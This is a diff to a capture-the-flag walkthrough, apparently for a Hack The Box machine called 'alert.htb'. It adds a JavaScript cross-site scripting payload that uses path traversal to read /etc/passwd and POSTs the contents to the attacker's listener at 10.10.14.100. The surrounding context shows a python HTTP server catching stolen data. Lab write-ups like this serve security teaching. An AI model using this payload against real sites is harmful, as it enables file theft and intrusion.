@@ -171,9 +171,27 @@ $ python3 -m http.server 8888
 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 10.10.11.44 - - [06/Jan/2025 00:02:00] "GET /grabber.php?c=%27+document.domain&lt;/script&gt; HTTP/1.1" 200 -
 ```
-### Enumerating APIs 
 ### Vulnerability Identification
+```js
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../etc/passwd")
+    .then(response => response.text())  // Corrected the arrow function and response parsing
+    .then(data => {
+        // Replace 'ip' with your local IP address
+        fetch("http://10.10.14.100:8888/", {  // Replace with your actual IP address
+            method: "POST",
+            headers: {
+                'Content-Type': 'text/plain',  // Ensure the content type is correct
+            },
+            body: data  // Send the fetched data as the body of the POST request
+        });
+    })
+    .catch(error => {
+        console.error("Error:", error);  // Handle errors
+    });
+</script>
 
+```
 ## Exploitation
 ### Post Exploitation Enumeration 
 ### Lateral Movement 
